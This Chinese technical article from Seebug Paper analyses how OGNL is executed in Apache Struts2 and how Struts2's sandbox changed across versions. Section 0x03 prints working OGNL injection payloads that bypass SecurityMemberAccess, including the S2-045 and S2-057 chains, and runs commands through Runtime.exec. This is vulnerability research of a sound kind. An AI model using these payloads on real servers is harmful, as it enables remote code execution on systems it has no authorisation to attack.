**作者：Lucifaer  
博客：<https://www.lucifaer.com>**

在分析Struts2漏洞的过程中就一直想把OGNL的运行机制以及Struts2对OGNL的防护机制总结一下，但是一直苦于自己对Struts2的理解不是很深刻而迟迟无法动笔，最近看了[lgtm的这篇文章](https://lgtm.com/blog/apache_struts_CVE-2018-11776-exploit)收获良多，就想在这篇文章的基础上总结一下目前自己对于OGNL的一些理解，希望师傅们斧正。

## 0x01 OGNL与Struts2

### 1.1 root与context

OGNL中最需要理解清楚的是`root`（根对象）、`context`（上下文）。

  * `root`：root可以理解为是一个java对象，表达式所规定的所有操作都是通过root来指定其对哪个对象进行操作。
  * `context`：context可以理解为对象运行的上下文环境，context以MAP的结构，利用键值对关系来描述对象中的属性以及值。

Struts2框架使用了标准的命名上下文（naming context，我实在是不知道咋翻译了-.
-）来执行OGNL表达式。处理OGNL的最顶层对象是一个Map对象，通常称这个Map对象为`context
map`或者`context`。而OGNL的`root`就在这个`context map`中。
**在表达式中可以直接引用root对象的属性，如果需要引用其他的对象，需要使用#标明** 。

框架将OGNL里的`context`变成了我们的`ActionContext`，将`root`变成了`valueStack`。Struts2将其他对象和`valueStack`一起放在`ActionContext`中，这些对象包括`application`、`session`、`request
context`的上下文映射。下面是一个图例：

![img](https://images.seebug.org/content/images/2019/01/16/1547627415000-15464230621989.jpg-w331s)

### 1.2 ActionContext

`ActionContext`是action的上下文，其本质是一个MAP，简单来说可以理解为一个action的小型数据库，整个action生命周期（线程）中所使用的数据都在这个`ActionContext`中。而对于OGNL来说`ActionContext`就是充当`context`的，并且在框架中

这里盗一张图来说明`ActionContext`中存有哪些东西：

![img](https://images.seebug.org/content/images/2019/01/16/1547627416000-15464139094502.jpg-w331s)

可以看到其中有三个常见的作用域`request`、`session`、`application`。

  * `attr`作用域则是保存着上面三个作用域的所有属性，如果有重复的则以`request`域中的属性为基准。
  * `paramters`作用域保存的是表单提交的参数。
  * `VALUE_STACK`，也就是常说的值栈，保存着`valueStack`对象，也就是说可以通过`ActionContext`访问到`valueStack`中的值。

### 1.3 valueStack

值栈本身是一个ArrayList，充当OGNL的`root`：

![img](https://images.seebug.org/content/images/2019/01/16/1547627417000-15464146328628.jpg-w331s)

`root`在源码中称为`CompoundRoot`，它也是一个栈，每次操作`valueStack`的出入栈操作其实就是对`CompoundRoot`进行对应的操作。每当我们访问一个action时，就会将action加入到栈顶，而提交的各种表单参数会在`valueStack`从顶向下查找对应的属性进行赋值。

这里的`context`就是`ActionContext`的引用，方便在值栈中去查找action的属性。

### 1.4 ActionContext和valueStack的关系

可以看到其实`ActionContext`和`valueStack`是“相互包含”的关系，当然准确点来说，`valueStack`是`ActionContext`中的一部分，而`ActionContext`所描述的也不只是一个OGNL`context`的代替品，毕竟它更多是为action构建一个独立的运行环境（新的线程）。而这样的关系就导致了我们可以通过`valueStack`访问`ActionContext`中的属性而反过来亦然。

其实可以用一种不是很标准的表达方式来描述这样的关系：可以把`valueStack`想成`ActionContext`的索引，你可以直接通过索引来找到表中的数据，也可以在表中找到所有数据的索引，无非是书与目录的关系罢了。

## 0x02 OGNL的执行

### 2.1 初始化ValueStack

我们从代码的角度来看看OGNL的执行流。从Struts2框架的代码中，我们可以清楚的看到OGNL的包是位于`xwork2`中的，而连通Struts2与xwork2的桥梁就是`ActionProxy`，也就是说在`ActionProxy`接管整个控制权前，`FilterDispatcher`就已经完成了对`ActionContext`的建立与初始化。

而具体的代码是在`org.apache.struts2.dispatcher.PrepareOperations`中：

![img](https://images.seebug.org/content/images/2019/01/16/1547627417000-15464833904918.jpg-w331s)

在这里如果没有Context存在的话，则会调用`ValueStackFactory`这个接口的`createValueStack`方法，跟进看一下：

![img](https://images.seebug.org/content/images/2019/01/16/1547627417000-15464841735723.jpg-w331s)

跟进`OgnlValueStackFactory`：

![img](https://images.seebug.org/content/images/2019/01/16/1547627417000-15464842298773.jpg-w331s)

这几个参数分别为：

![img](https://images.seebug.org/content/images/2019/01/16/1547627417000-15464842534430.jpg-w331s)

跟进看一下`OgnlValueStack`的构造方法：

![img](https://images.seebug.org/content/images/2019/01/16/1547627417000-15464844823917.jpg-w331s)

![img](https://images.seebug.org/content/images/2019/01/16/1547627417000-15464845456793.jpg-w331s)

可以看到设置根、设置安全防范措施、以及调用`Ognl.createDefaultContext`来创建默认的`Context`映射：

![img](https://images.seebug.org/content/images/2019/01/16/1547627417000-15464848098458.jpg-w331s)

![img](https://images.seebug.org/content/images/2019/01/16/1547627417000-15464848456067.jpg-w331s)

这里我们跟到`OgnlContext`中看一下，有这么几个对象时比较重要的，他们规定了OGNL计算中的计算规则处理类：

![img](https://images.seebug.org/content/images/2019/01/16/1547627417000-15464982871371.jpg-w331s)

  * `_root`：在OgnlContext内维护着的Root对象，它是OGNL主要的操作对象
  * `_values`：如果希望在OGNL计算时使用传入的Map作为上下文环境，OGNL依旧会创建一个OgnlContext，并将所传入的Map中所有的键值对维护在`_values`变量中。这个变量就被看作真正的容器，并在OGNL的计算中发挥作用。
  * `ClassResolver`：指定处理class loading的处理类。实际上这个处理类是用于指定OGNL在根据Class名称来构建对象时，寻找Class名称与对应的Class类之间对应关系的处理方式。在默认情况下会使用JVM的class.forName机制来处理。
  * `TypeConverter`：指定处理类型转化的处理类。这个处理类非常关键，它会指定一个对象属性转化成字符串以及字符串转化成Java对象时的处理方式。
  * `MemberAccess`：指定处理属性访问策略的处理方式。

可以看到这里的`ClassResolver`是有关类的寻址以及调用的，也就是常说的所谓的执行。

### 2.2 将现有的值和字段添加进ValueStack中（构造）

在初始化了`ValueStack`后，发现了后面的`container.inject(stack);`，这里是将依赖项注入现有的字段和方法，而在这个地方会调用`com.opensymphony.xwork2.ognl.OgnlValueStack$setOgnlUtil`将我们所关心的黑名单给添加进来：

![img](https://images.seebug.org/content/images/2019/01/16/1547627417000-15469425702400.jpg-w331s)

然而其根本的作用是 **创建_memberAccess** 。

这里可以注意到调用栈中首先是初始化了`ValueStack`之后再通过`OgnlUtil`这个API将数据和方法注入进`ValueStack`中，而`ValueStack`又是利用`OgnlContext`来创建的，所以会看到`OgnlContext`中的
**_memberAccess与securityMemberAccess是同一个SecurityMemberAccess类的实例，而且内容相同，也就是说全局的OgnlUtil实例都共享着相同的设置。如果利用OgnlUtil更改了设置项（excludedClasses、excludedPackageNames、excludedPackageNamePatterns）则同样会更改_memberAccess中的值。**

这里可能不太好理解，可以看下面这几张图：

  1. 首先`ValueStack`本身是个`OgnlContext`

![img](https://images.seebug.org/content/images/2019/01/16/1547627418000-15470170533527.jpg-w331s)

  2. 之后调用`setOgnlUtil`添加黑名单：

![
](https://images.seebug.org/content/images/2019/01/21963ef2-b7c9-479a-be6f-e095114c42ae.jpg-w331s)

  3. 然后`OgnlUtil`中的这些值赋给`SecurityMemberAccess`：

![img](https://images.seebug.org/content/images/2019/01/16/1547627418000-15470167097980.jpg-w331s)

![img](https://images.seebug.org/content/images/2019/01/16/1547627418000-15470168699567.jpg-w331s)

  4. 也就是与`OgnlContext`中的`_memberAccess`建立关系，即创建了`_memberAccess`：

![img](https://images.seebug.org/content/images/2019/01/16/1547627418000-15470176048468.jpg-w331s)

而这一点在沙箱绕过时起到了很重要的作用。

### 2.3 创建拦截器（Interceptor）

在之后当控制权转交给`ActionProxy`时会调用`OgnlUtil`作为操作OGNL的API，在创建拦截器（`Interceptor`）时会调用`com.opensymphony.xwork2.config.providers.InterceptorBuilder`：

![img](https://images.seebug.org/content/images/2019/01/16/1547627418000-15469435251224.jpg-w331s)

在这里利用工场函数来创建拦截器，跟进看一下：

![img](https://images.seebug.org/content/images/2019/01/16/1547627418000-15469435768671.jpg-w331s)

![img](https://images.seebug.org/content/images/2019/01/16/1547627419000-15469447377180.jpg-w331s)

![img](https://images.seebug.org/content/images/2019/01/16/1547627419000-15469449020784.jpg-w331s)

![img](https://images.seebug.org/content/images/2019/01/16/1547627419000-15469449199402.jpg-w331s)

![img](https://images.seebug.org/content/images/2019/01/16/1547627419000-15469449399481.jpg-w331s)

![img](https://images.seebug.org/content/images/2019/01/16/1547627419000-15469449602034.jpg-w331s)

也就是把设置好的黑名单赋到`SecurityMemberAccess`中，在当前的上下文中用以检验表达式所调用的方法是否允许被调用。

### 2.4 OGNL执行（利用反射调用）

说完了初始化，再来说一下所谓的OGNL执行，在这里引用一下《Struts2技术内幕》这本书的一个表，这个表主要列举了OGNL计算时所需要遵循的一些重要的计算规则和默认实现类：

![-w768](https://images.seebug.org/content/images/2019/01/16/1547627419000-15464991029777.jpg-w331s)

接下来就跟进`CompoundRootAccessor`看一下：

![img](https://images.seebug.org/content/images/2019/01/16/1547627419000-15464991684892.jpg-w331s)

![img](https://images.seebug.org/content/images/2019/01/16/1547627419000-15465008912903.jpg-w331s)

在这里拓展了`ognl.DefaultClassResovler`，可以支持一些特殊的class名称。

## 0x03 OGNL的攻防史

回看S2系列的漏洞，每当我们找到一个可以执行OGNL表达式的点在尝试构造恶意的OGNL时都会遇到这个防护机制，在我看了[lgtm](https://lgtm.com/blog/apache_struts_CVE-2018-11776-exploit)这篇文章后，我就想把围绕`SecurityMemberAccess`的攻防历史来全部梳理一遍。

可以说所有在对于OGNL的攻防全部都是基于如何使用静态方法。`Struts2`的防护措施从最开始的正则，到之后的黑名单，在保证OGNL强大功能的基础上，将可能执行静态方法的利用链给切断。在分析绕过方法时，需要注意的有这么几点：

  * `struts-defult.xml`中的黑名单
  * `com.opensymphony.xwork2.ognl.SecurityMemberAccess`
  * `Ognl`包

以下图例左边都是较为新的版本，右边为老版本。

### 3.1 Struts 2.3.14.1版本前

S2-012、S2-013、S3-014的出现促使了这次更新，可以说在跟新到2.3.14.1版本前，ognl的利用基本属于不设防状态，我们可以看一下这两个版本的diff，不难发现当时还没有出现黑名单这样的说法，而修复的关键在于`SecurityMemberAccess`：

![img](https://images.seebug.org/content/images/2019/01/16/1547627419000-15470237734614.jpg-w331s)

左边是2.3.14.1的版本，右边是2.3.14的版本，不难看出在这之前可以通过ognl直接更改`allowStaticMethodAccess=true`，就可以执行后面的静态方法了，所以当时非常通用的一种poc是：

    
    
    (#_memberAccess['allowStaticMethodAccess']=true).(@java.lang.Runtime@getRuntime().exec('calc'))

而在2.3.14.1版本后将`allowStaticMethodAccess`设置成final属性后，就不能显式更改了，这样的poc显然也失效了。

### 3.2 Struts 2.3.20版本前

在2.3.14.1后虽然不能更改`allowStaticMethodAccess`了，但是还是可以通过`_memberAccess`使用类的构造函数，并且访问公共函数，所以可以看到当时有一种替代的poc：

    
    
    (#p=new java.lang.ProcessBuilder('xcalc')).(#p.start())

直到2.3.20，这样的poc都可以直接使用。在2.3.20后，Struts2不仅仅引入了黑名单（excludedClasses,
excludedPackageNames 和
excludedPackageNamePatterns），更加重要的是阻止了所有构造函数的使用，所以就不能使用`ProcessBuilder`这个payload了。

### 3.3 Struts 2.3.29版本前

左为2.3.29版本，右边为2.3.28版本

![img](https://images.seebug.org/content/images/2019/01/16/1547627420000-15470227581652.jpg-w331s)

从黑名单中可以看到禁止使用了`ognl.MemberAccess`和`ognl.DefaultMemberAccess`，而这两个对象其实就是2.3.20-2.3.28版本的通用绕过方法，具体的思路就是利用`_memberAccess`调用静态对象`DefaultMemberAccess`，然后用`DefaultMemberAccess`覆盖`_memberAccess`。那么为什么说这样就可以使用静态方法了呢？

我们先来看一下可以在S2-032、S2-033、S2-037通用的poc：

    
    
    (#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('xcalc'))

我们来看一下`ognl.OgnlContext@DEFAULT_MEMBER_ACCESS`：

![img](https://images.seebug.org/content/images/2019/01/16/1547627420000-15471036060838.jpg-w331s)

看过上一节的都知道，在程序运行时在`setOgnlUtil`方法中将黑名单等数据赋给`SecurityMemberAccess`，而这就是创建`_memberAccess`的过程，在动态调试中，我们可以看到这两个对象的id甚至都是一样的，而`SecurityAccess`这个对象的父类本身就是`ognl.DefaultMemberAccess`，而其建立关系的过程就相当于继承父类并重写父类的过程，所以这里我们利用其父类`DefaultMemberAccess`覆盖`_memberAccess`中的内容，就相当于初始化了`_memberAccess`，这样就可以绕过其之前所设置的黑名单以及限制条件。

### 3.4 Struts 2.3.30+/2.5.2+

到了2.3.30(2.5.2)之后的版本，我们可以使用的`_memberAccess`和`DefaultMemberAccess`都进入到黑名单中了，覆盖的方法看似就不行了，而这个时候S2-045的payload提供了一种新的思路：

    
    
    (#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('xcalc'))

可以看到绕过的关键点在于：

  * 利用Ognl执行流程利用`container`获取了`OgnlUtil`实例
  * 清空了`OgnlUtil$excludedClasses`黑名单，释放了`DefaultMemberAccess`
  * 利用`setMemberAccess`覆盖

而具体的流程可以参考2.2的内容。

### 3.5 Struts 2.5.16

分析过S2-057后，你会发现ognl注入很容易复现，但是想要调用静态方法造成代码执行变得很难，我们来看一下Struts2又做了哪些改动：

  * 2.5.13版本后禁止访问`coontext.map`

准确来说是ognl包版本的区别，在2.5.13中利用的是3.1.15版本，在2.5.12版本中使用的是3.1.12版本：

![img](https://images.seebug.org/content/images/2019/01/16/1547627420000-15471155308956.jpg-w331s)

而这个改变是在`OgnlContext`中：

![img](https://images.seebug.org/content/images/2019/01/16/1547627420000-15471156088979.jpg-w331s)

不只是get方法，put和remove都没有办法访问了，所以说从根本上禁止了对`context.map`的访问。

  * 2.5.20版本后`excludedClasses`不可变了，具体的代码在[这里](https://github.com/apache/struts/commit/748da3f8ce6b9f3953bc418745c35a534e5b98ca)

所以在S2-045时可使用的payload已经没有办法再使用了，需要构造新的利用方式。

文章提出了这么一种思路:

  * 没有办法使用`context.map`，可以调用`attr`，前文说过`attr`中保存着整个`context`的变量与方法，可以通过`attr`中的方法返回给我们一个`context.map`。
  * 没有办法直接调用`excludedClasses`，也就不能使用`clear`方法来清空，但是还可以利用`setter`来把`excludedClasses`给设置成空
  * 清空了黑名单，我们就可以利用`DefaultMemberAccess`来覆盖`_memberAccess`，来执行静态方法了。

而这里又会出现一个问题，当我们使用`OgnlUtil`的`setExcludedClasses`和`setExcludedPackageNames`将黑名单置空时并非是对于源（全局的OgnlUtil）进行置空，也就是说`_memberAccess`是源数据的一个引用，就像前文所说的，在每次`createAction`时都是通过`setOgnlUtil`利用全局的源数据创建一个引用，这个引用就是一个`MemberAccess`对象，也就是`_memberAccess`。所以这里只会影响这次请求的`OgnlUtil`而并未重新创建一个新的`_memberAccess`对象，所以旧的`_memberAccess`对象仍未改变。

而突破这种限制的方式就是再次发送一个请求，将上一次请求已经置空的`OgnlUitl`作为源重新创建一个`_memberAccess`，这样在第二次请求中`_memberAccess`就是黑名单被置空的情况，这个时候就释放了`DefaultMemberAccess`，就可以进行正常的覆盖以及执行静态方法。

poc为：

    
    
    (#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))
    
    (#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('curl 127.0.0.1:9001'))

需要发送两次请求：

![img](https://images.seebug.org/content/images/2019/01/16/1547627420000-15471891401187.jpg-w331s)

![img](https://images.seebug.org/content/images/2019/01/16/1547627420000-15471891816332.jpg-w331s)

![img](https://images.seebug.org/content/images/2019/01/16/1547627420000-15471891957595.jpg-w331s)

## 0x04 现阶段的OGNL

Struts2在
2.5.16版本后做了很多修改，截止到写文章的时候，已经更新到2.5.20，接下来我将把这几个版本的区别全部都列出来，并且说明现在绕过Ognl沙箱面临着哪些阻碍。同上一节，左边都为较新的版本，右边为较旧的版本。

### 4.1 2.5.17的改变（限制命名空间）

  1. 黑名单的变动，禁止访问`com.opensymphony.xwork2.ognl.`

![img](https://images.seebug.org/content/images/2019/01/16/1547627420000-15471971431990.jpg-w331s)

讲道理，2.5.17版本的修补真的是很暴力，直接在黑名单中加上了`com.opensymphony.xwork2.ognl.`也就是说我们根本没办法访问这个Struts2重写的ognl包了。

  2. 切断了动态引用的方式，需要利用构造函数生成

![img](https://images.seebug.org/content/images/2019/01/16/1547627420000-15471974788040.jpg-w331s)

不谈重写了`setExcludedClasses`和`setExcludedPackageNamePatterns`，单单黑名单的改进就极大的限制了利用。

### 4.2 2.5.19的改进

  1. ognl包的升级，从3.1.15升级到3.1.21

![img](https://images.seebug.org/content/images/2019/01/16/1547627420000-15471982817893.jpg-w331s)

  2. 黑名单改进

![
](https://images.seebug.org/content/images/2019/01/bbda1811-da46-4231-98ee-6bad994e227e.jpg-w331s)

  3. 在`OgnlUtil`中`setXWorkConverter`、`setDevMode`、`setEnableExpressionCache`、`setEnableEvalExpression`、`setExcludedClasses`、`setExcludedPackageNamePatterns`、`setExcludedPackageNames`、`setContainer`、`setAllowStaticMethodAccess`、`setDisallowProxyMemberAccess`都从public方法变成了protected方法了：

![img](https://images.seebug.org/content/images/2019/01/16/1547627421000-15471986400847.jpg-w331s)

![img](https://images.seebug.org/content/images/2019/01/16/1547627421000-15471986545349.jpg-w331s)

也就是说没有办法显式调用`setExcludedClasses`、`setExcludedPackageNamePatterns`、`setExcludedPackageNames`了。

### 4.3 master分支的改变

  1. ognl包的升级，从3.1.21升级到3.2.10，直接删除了`DefaultMemberAccess.java`，同时删除了静态变量`DEFAULT_MEMBER_ACCESS`，并且`_memberAccess`变成了final：

![img](https://images.seebug.org/content/images/2019/01/16/1547627421000-15471994782111.jpg-w331s)

![img](https://images.seebug.org/content/images/2019/01/16/1547627421000-15471998270846.jpg-w331s)

  2. `SecurityMemberAccess`不再继承`DefaultMemberAccess`而直接转为`MemberAccess`接口的实现：

![img](https://images.seebug.org/content/images/2019/01/16/1547627422000-15472003356029.jpg-w331s)

可以看到Struts2.5.*基本上是对Ognl的执行做出了重大的改变，`DefaultAccess`彻底退出了历史舞台意味着利用父类覆盖`_memberAccess`的利用方式已经无法使用，而黑名单对于`com.opensymphony.xwork2.ognl`的限制导致我们基本上没有办法利用`Ognl`本身的API来更改黑名单，同时`_memberAccess`变为final属性也使得S2-057的这种利用`_memberAccess`暂时性的特征而进行“重放攻击”的方式测地化为泡影。

### 4.4 总结

Struts2随着其不断地发展，减少了原来框架的一部分灵活性而大大的增强了其安全性，如果按照master分支的改动趋势上看，以我的理解上来说，可以说现在基本上没得搞…

## 0x05 Reference

  * <https://cloud.tencent.com/developer/article/1024093>
  * <https://lgtm.com/blog/apache_struts_CVE-2018-11776-exploit>
  * 《Struts2技术内幕》

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/794/>

